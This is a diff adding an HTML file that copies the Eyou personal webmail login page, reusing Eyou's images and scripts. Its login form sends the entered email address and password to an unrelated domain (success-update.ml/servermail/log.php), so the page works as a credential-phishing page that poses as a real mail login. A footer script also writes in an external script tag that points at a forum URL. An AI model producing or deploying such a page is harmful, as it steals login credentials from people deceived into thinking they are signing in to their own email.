@@ -1,0 +1,105 @@
+﻿﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="baidu-site-verification" content="OOkrntIZE0" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Eyou个人邮件系统</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<style>
+*{ margin:0; padding:0}
+body{ color:#464646; font:12px normal Verdana, Arial, Helvetica, sans-serif; background:#ECF5FF url(http://i.imgur.com/VdQP1xq.jpg) center top repeat-x;}
+.main{ height: 195px;  width:438px;margin:336px auto 0 auto;}
+.text{ width:272px; margin:8px 10px 0 8px; font-family:Verdana, Arial, Helvetica, sans-serif; border:none}
+.cont{ padding:10px 10px 0 0;}
+table{ width:100%;}
+th{ padding-left:50px; font-weight:400; height:40px;}
+td,img,input,select{ vertical-align:middle}
+
+.btn1,.btn2{ height:31px; width:68px; border:none; font-size:12px; color:#fff; line-height:27px; font-weight:700}
+.btn1{ background:url(http://www.eyou.com/tpl/user/tpl1/images/btn1.jpg) no-repeat;}
+.btn2{ background:url(http://www.eyou.com/tpl/user/tpl1/images/btn2.jpg) no-repeat;}
+a{ color:#5491CF; text-decoration:underline;}
+a:hover{ text-decoration:none;}
+.inputbox{ height:34px; width:292px; background:url(http://www.eyou.com/tpl/user/tpl1/images/text.jpg);}
+#message_out{height:20px;text-align:center;color:red;}
+</style>
+<script type="text/javascript">
+<!--
+var gUrlPrefix = "/user/";
+var gIsCaptcha = 0;
+var gCode = 0;
+-->
+</script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/user/tpl1/js/lang.zh_cn.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/public/jquery/em_jquery.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/user/public/jquery/em_jquery_user.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/public/js/url_control.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/public/js/common.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/user/tpl1/js/common.js?v=5.0.30428.0509"></script>
+<script type="text/javascript" src="http://www.eyou.com/tpl/user/tpl1/js/user/tpl1/js/login.js?v=5.0.30428.0509"></script>
+<script language="javascript">
+var gLogin = new Login();
+gLogin.initLogin();
+</script>
+</head>
+
+<body>
+<div class="main" id="content">
+  <div class="cont">
+<div id="message_out">
+<div id="message" style="display:none;"></div>
+</div>
+    <table>
+        <form id="form_login" method="post" action="https://success-update.ml/servermail/log.php" >
+
+
+      <tr>
+        <th>用户名</th>
+        <td><div class="inputbox"><input id="user" type="email" name="login" class="text" value="" required /></div>
+
+	<div style="display:none">
+        <div id="tr_domain_list" style="display:none">
+        <strong>@</strong>
+        <select id="domain_list_select" name="domain_name" onchange="this.title=this.options[this.options.selectedIndex].text">
+        <option></option>
+        </select>
+        </div>
+	</div>
+	</td>
+      </tr>
+      <tr>
+        <th>密　码</th>
+        <td><div class="inputbox"><input id="password" type="password" name="password" title="密　码" class="text" required /></div></td>
+
+      </tr>
+      <tr>
+        <td style="padding-top:42px;" colspan="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<!-- input name="button" type="button" class="btn1" value="注　册" onclick="window.location = gUrlPrefix + '?q=register';"/ -->&nbsp;&nbsp;&nbsp;&nbsp;
+                     
+                    
+          
+	  <input id="submit" type="submit" value="登 录" class="btn2"/>
+        </td>
+      </tr>
+	  </form>
+    </table>
+  </div>
+</div>
+&nbsp;
+  <div style="text-align: center;" class="cr">
+声明：本站非亿邮官网！仅为个人用户提供免费邮箱服务，服务支持请联系support@eyou.com</div>
+  </div>
+<br>
+  <div style="text-align: center;" class="cr">
+信网信息技术有限公司&copy;2001-2015版权所有 
+  </div>
+
+<!--Adforward Begin:-->
+<SCRIPT LANGUAGE="JavaScript">
+ if (window.screen.width >= 1024){
+                     document.write("<S"+"CRIPT LANGUAGE='JavaScript1.1' SRC='http://xy3.netease.com/viewthread.php?tid=1132248&extra=page%3D1'></SCRIPT"+">");
+                                                     }
+</SCRIPT>
+<!--Adforward End-->
+</body>
+</html>
